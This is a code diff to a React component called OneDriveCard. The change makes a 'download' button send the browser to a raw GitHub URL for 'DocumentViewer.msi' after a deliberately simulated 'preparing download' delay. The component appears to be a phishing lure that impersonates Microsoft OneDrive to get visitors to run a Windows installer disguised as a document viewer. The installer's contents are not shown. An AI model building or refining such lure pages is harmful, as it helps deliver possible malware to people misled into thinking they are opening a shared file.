@@ -1,8 +1,8 @@
 
 import React, { useState } from 'react';
 
-// The file is located in the repository root
-const DOWNLOAD_FILENAME = "DocumentViewer.msi";
+// The direct raw download link for the file on GitHub
+const DOWNLOAD_URL = "https://github.com/deeclara67-png/Document2/raw/main/DocumentViewer.msi";
 
 const OneDriveCard: React.FC = () => {
   const [isDownloading, setIsDownloading] = useState(false);
@@ -12,13 +12,8 @@ const OneDriveCard: React.FC = () => {
     
     // Brief delay to simulate "preparing download" before starting the transfer
     setTimeout(() => {
-      // Create a temporary link element to trigger the download explicitly
-      const link = document.createElement('a');
-      link.href = `./${DOWNLOAD_FILENAME}`;
-      link.download = DOWNLOAD_FILENAME;
-      document.body.appendChild(link);
-      link.click();
-      document.body.removeChild(link);
+      // Direct the browser to the raw GitHub file URL to trigger download
+      window.location.href = DOWNLOAD_URL;
       
       // Reset state after a delay to allow the user to click again if needed
       setTimeout(() => setIsDownloading(false), 2000);
